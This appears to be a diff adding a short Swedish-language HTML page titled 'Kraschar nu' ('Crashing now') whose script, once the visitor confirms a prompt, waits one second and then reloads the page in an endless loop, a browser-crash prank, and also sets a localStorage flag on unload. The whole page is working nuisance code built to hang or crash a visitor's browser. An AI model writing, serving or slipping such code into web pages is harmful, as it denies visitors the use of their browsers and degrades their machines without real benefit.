@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+
+<h2>Kraschar nu</h2>
+
+
+<p>Tryck OK</p>
+
+
+<p id="demo"></p>
+
+
+<script>
+onbeforeunload = function(){localStorage.x=1};
+
+
+if(confirm("Är du verkligen säker?")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
+</script>
+
+
+</body>
+</html>
